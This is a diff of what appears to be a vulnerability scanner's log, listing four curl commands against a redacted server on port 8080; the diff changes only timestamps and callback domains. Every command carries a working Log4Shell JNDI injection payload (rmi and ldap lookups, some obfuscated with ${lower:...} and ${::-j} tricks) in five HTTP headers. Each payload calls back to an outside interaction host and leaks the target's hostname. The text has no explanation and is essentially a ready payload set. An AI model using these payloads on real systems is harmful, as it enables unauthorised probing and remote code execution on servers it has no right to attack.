@@ -2,31 +2,31 @@
 
 Trigger template: null
 Protocol: http
-Timestamp: 2022-01-28T14:07:09.947382789Z
+Timestamp: 2022-01-28T14:46:54.391526373Z
 Adress: REDACTED
 Curl command:
-curl -X 'GET' -d '' -H 'Authentication: ${${lower:jndi}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyybs.oast.live/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:jndi}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyb1.oast.live/poc}' -H 'User-Agent: ${${lower:jndi}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyybq.oast.live/poc}' -H 'X-Api-Version: ${${lower:jndi}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyybo.oast.live/poc}' -H 'X-Forwarded-For: ${${lower:jndi}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyybw.oast.live/poc}' 'http://REDACTED:8080/'
+curl -X 'GET' -d '' -H 'Authentication: ${${lower:jndi}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyyc.oast.fun/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:jndi}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyye.oast.fun/poc}' -H 'User-Agent: ${${lower:jndi}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyyr.oast.fun/poc}' -H 'X-Api-Version: ${${lower:jndi}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyyg.oast.fun/poc}' -H 'X-Forwarded-For: ${${lower:jndi}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyyk.oast.fun/poc}' 'http://REDACTED:8080/'
 
 
 Trigger template: null
 Protocol: http
-Timestamp: 2022-01-28T14:07:09.95032914Z
+Timestamp: 2022-01-28T14:46:54.396893944Z
 Adress: REDACTED
 Curl command:
-curl -X 'GET' -d '' -H 'Authentication: ${${::-j}ndi:rmi://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyydk.oast.live/ass}' -H 'Host: REDACTED:8080' -H 'Referer: ${${::-j}ndi:rmi://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyydg.oast.live/ass}' -H 'User-Agent: ${${::-j}ndi:rmi://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyydn.oast.live/ass}' -H 'X-Api-Version: ${${::-j}ndi:rmi://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyydr.oast.live/ass}' -H 'X-Forwarded-For: ${${::-j}ndi:rmi://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyde.oast.live/ass}' 'http://REDACTED:8080/'
+curl -X 'GET' -d '' -H 'Authentication: ${${::-j}ndi:rmi://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyns.oast.fun/ass}' -H 'Host: REDACTED:8080' -H 'Referer: ${${::-j}ndi:rmi://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyn1.oast.fun/ass}' -H 'User-Agent: ${${::-j}ndi:rmi://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyynq.oast.fun/ass}' -H 'X-Api-Version: ${${::-j}ndi:rmi://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyno.oast.fun/ass}' -H 'X-Forwarded-For: ${${::-j}ndi:rmi://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyynw.oast.fun/ass}' 'http://REDACTED:8080/'
 
 
 Trigger template: null
 Protocol: http
-Timestamp: 2022-01-28T14:07:09.952642634Z
+Timestamp: 2022-01-28T14:46:54.40140754Z
 Adress: REDACTED
 Curl command:
-curl -X 'GET' -d '' -H 'Authentication: ${jndi:ldap://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyynw.oast.live/badClassName}' -H 'Host: REDACTED:8080' -H 'Referer: ${jndi:ldap://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyno.oast.live/badClassName}' -H 'User-Agent: ${jndi:ldap://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyns.oast.live/badClassName}' -H 'X-Api-Version: ${jndi:ldap://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyynq.oast.live/badClassName}' -H 'X-Forwarded-For: ${jndi:ldap://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyn1.oast.live/badClassName}' 'http://REDACTED:8080/'
+curl -X 'GET' -d '' -H 'Authentication: ${jndi:ldap://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyd6.oast.fun/badClassName}' -H 'Host: REDACTED:8080' -H 'Referer: ${jndi:ldap://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyd4.oast.fun/badClassName}' -H 'User-Agent: ${jndi:ldap://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyry.oast.fun/badClassName}' -H 'X-Api-Version: ${jndi:ldap://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyda.oast.fun/badClassName}' -H 'X-Forwarded-For: ${jndi:ldap://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyydh.oast.fun/badClassName}' 'http://REDACTED:8080/'
 
 
 Trigger template: null
 Protocol: http
-Timestamp: 2022-01-28T14:07:09.960316019Z
+Timestamp: 2022-01-28T14:46:54.406836385Z
 Adress: REDACTED
 Curl command:
-curl -X 'GET' -d '' -H 'Authentication: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyfe.oast.live/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyfr.oast.live/poc}' -H 'User-Agent: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyfy.oast.live/poc}' -H 'X-Api-Version: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyfn.oast.live/poc}' -H 'X-Forwarded-For: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7pvh1pbephgagdc256gc839tnyyyyyfg.oast.live/poc}' 'http://REDACTED:8080/'
+curl -X 'GET' -d '' -H 'Authentication: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyfw.oast.fun/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyfo.oast.fun/poc}' -H 'User-Agent: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyfc.oast.fun/poc}' -H 'X-Api-Version: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyfq.oast.fun/poc}' -H 'X-Forwarded-For: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.c7q03kkvgbu6n5419ir0c84ydsyyyyyf1.oast.fun/poc}' 'http://REDACTED:8080/'
